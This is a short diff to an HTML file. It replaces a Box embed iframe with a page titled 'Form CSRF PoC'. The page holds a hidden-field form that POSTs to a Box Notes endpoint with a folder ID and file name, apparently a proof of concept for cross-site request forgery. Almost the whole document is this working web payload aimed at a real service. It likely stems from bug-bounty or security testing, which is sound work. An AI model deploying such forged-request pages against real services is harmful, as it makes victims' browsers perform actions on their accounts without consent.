@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<title>Document</title>
-</head>
-<body>
-	<iframe src="https://app.box.com/embed/s/nseinmpfvhnrtn64mj0x108yr75xlhsb?sortColumn=date" width="500" height="400" frameborder="0" allow="local-network-access *; clipboard-read *; clipboard-write *" allowfullscreen webkitallowfullscreen msallowfullscreen></iframe>
-</body>
+	<body>
+		<h1>Form CSRF PoC</h1>
+		<form method="POST" action="https://notes.services.box.com/notes">
+			<input type="hidden" name="folderId" value="410271489289">
+			<input type="hidden" name="fileName" value="kucing">
+			<input type="submit" value="Submit Request">
+		</form>
+	</body>
 </html>
